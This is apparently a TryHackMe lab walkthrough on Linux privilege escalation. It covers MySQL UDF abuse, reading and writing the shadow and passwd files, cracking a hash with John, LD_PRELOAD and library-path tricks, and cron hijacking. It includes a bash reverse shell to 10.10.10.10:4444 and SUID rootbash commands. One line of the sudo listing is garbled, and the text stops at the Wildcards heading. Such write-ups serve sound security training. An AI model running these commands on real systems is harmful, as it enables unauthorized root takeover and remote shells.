# TRYHACKME : Linux PrivEsc
Deploy the target machine, and enter the following ssh credentials: `user:password321`

Let's perform a basic nmap scan:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a4:6c:d1:c8:5b:03:f2:af:33:3f:84:15:cf:15:ed:ba (DSA)
|_  2048 08:84:3e:96:4d:9a:2f:a1:db:be:68:29:80:ab:f3:56 (RSA)
25/tcp   open  smtp    Exim smtpd 4.84
| smtp-commands: debian.localdomain Hello ip-10-4-124-80.eu-west-1.compute.internal [10.4.124.80], SIZE 52428800, 8BITMIME, PIPELINING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP
80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
|_http-server-header: Apache/2.2.16 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      49840/tcp   mountd
|   100005  1,2,3      54262/udp   mountd
|   100021  1,3,4      50744/udp   nlockmgr
|   100021  1,3,4      60890/tcp   nlockmgr
|   100024  1          35973/udp   status
|_  100024  1          53668/tcp   status
2049/tcp open  nfs     2-4 (RPC #100003)
8080/tcp open  http    nginx 1.6.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.6.2
|_http-title: Welcome to nginx on Debian!
Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Service Exploits
Simply copy in consecutive order the ff commands:
```
cd /home/user/tools/mysql-udf
```
Compiler the following file `raptor_udf2.c`
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Connect to the mysql with no password:
```
mysql -u root
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
whoami  // voila root access
```


## Weak File Permissions - Readable /etc/shadow
```
ls -l /etc/shadow
cat /etc/shadow
```
Save the root password hash to a txt file. The hash is found between the first and second colon.

Then run John the Ripper or use online resources to crack it.
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
The type of hashing algorithm used will appear during John the Ripper cracking.

## Weak File Permissions - Writable /etc/shadow
If the file is writable, we can change the root password by generating a new hash password (same hashing algorithm as the previous password), and replacing the existing hash.
```
mkpasswd -m sha-512 newpasswordhere
```
Then edit the /etc/shadow and replace the old hash password.

Switch to root user.
```
su
```

## Weak File Permission - Writable /etc/passwd
Some old versions of linux stores user password hashes. 

If the `/etc/passwd` happens to be writable, we can generate a hash and store it within the first and second colon.

Generate new hash password:
```
openssl passwd newpasswordhere
```

Then edit the root in `/etc/passwd`. Place the hash between the first and second hash.

After that you can switch to the root user.


```
su
```

## Sudo - Shell Escape Sequences

List all programs user has sudo permissions.

user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

```
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2e metadata related to the photo by looking at the post’s metadata.
    (root) NOPASSWD: /bin/more
```

You can look up in [GTFOBins](https://gtfobins.github.io/) each directory and their exploit command to access root, except `/apache2`.

## Sudo - Environmental Variables
### sudo -l
From using the `sudo -l` command, the environment variables shared with the users can also be exploited.

```
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

We have a tool called `preload.c` we can use to exploit the `env_keep+=LD_PRELOAD`.

Compile the following tool with the command:
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Then run in sudo any program you can run (I used `vim`), while setting the LD_PRELOAD with the full path of new shared object: 
```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
Then you'll get root access.

### Program's Shared Library

You can also exploit shared libraries used by a program.

Let's use the `apache2` program for example:
```
user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff629ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f5534a7d000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f5534859000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f553461f000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f5534403000)
        libc.so.6 => /lib/libc.so.6 (0x00007f5534097000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f5533e92000)
        librt.so.1 => /lib/librt.so.1 (0x00007f5533c8a000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f5533a53000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f553384e000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f5533626000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f5534f3a000)
```

We have a tool called library_path.c from the `tools` directory, we compile it first in the `/tmp` directory:
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Then run sudo command with apache2 program while setting up the library shared with `/tmp` directory storing the compiled tool before:
```
sudo LD_LIBRARY_PATH=/tmp apache2

```
Then you'll get root access.

## Cron Jobs - File Permission

First, let's view the following programs or scripts cronjob is scheduled to run.

```
user@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

Below are the two shell scripts scheduled to run: `overwrite.sh` & `/usr/local/bin/compress.sh`

Let's find out the permissions we have to each of these scripts:
```
// FOR compress.sh

user@debian:~$ ls -l /usr/local/bin/compress.sh
-rwxr--r-- 1 root staff 53 May 13  2017 /usr/local/bin/compress.sh          // we don't have luck with this one


// FOR overwrite.sh

user@debian:~$ locate overwrite.sh
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 1829.4 days)
/usr/local/bin/overwrite.sh
user@debian:~$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh        // lucky! it's writable
```

Now let's do the work.

Open the shell file and replace it with the ff. payload to start reverse shell with our `tun0` ip and port.

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Start your netcat listener after editing the script file.

And voila, root access!

## Cron Jobs - PATH Environment Variable

From previous `cat /etc/crontab`, these are the listed PATH variables:
```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

The `/home/user` PATH seems to also run scheduled cronjobs.

Let's now create an executable file for exploit:
```
vim overwrite.sh

+++ ADD THE FOLLOWING +++
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
+++++++++++++++++++++++++

chmod +x /home/user/overwrite.sh
```

Wait for a minute for cronjob to run the following script. 

Then run the ff. command:
```
/tmp/rootbash -p
```

Voila, root!

## Cron Jobs - Wildcards


